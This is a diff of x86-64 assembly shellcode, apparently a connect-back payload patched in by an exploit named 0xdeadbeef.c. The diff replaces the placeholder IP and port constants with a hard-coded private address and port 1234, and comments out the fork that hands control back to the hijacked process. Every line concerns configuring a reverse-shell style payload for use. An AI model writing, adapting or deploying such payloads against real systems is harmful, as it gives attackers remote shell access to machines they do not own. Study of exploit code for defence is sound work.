@@ -15,8 +15,8 @@ SYS_GETUID	equ 0x66
 AF_INET		equ 0x2
 SOCK_STREAM	equ 0x1
 
-IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
-PORT		equ 0x1337	;; patched by 0xdeadbeef.c
+IP		equ 251789322 ;; patched by 0xdeadbeef.c
+PORT		equ 53764 ;; patched by 0xdeadbeef.c
 
 _start:
 		;; save registers
@@ -54,10 +54,10 @@ _start:
 		js      return
 
 		;; fork
-		mov     rax, SYS_FORK
-		syscall
-		test    rax, rax
-		jne	return
+		;mov     rax, SYS_FORK
+		;syscall
+		;test    rax, rax
+		;jne	return
 
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
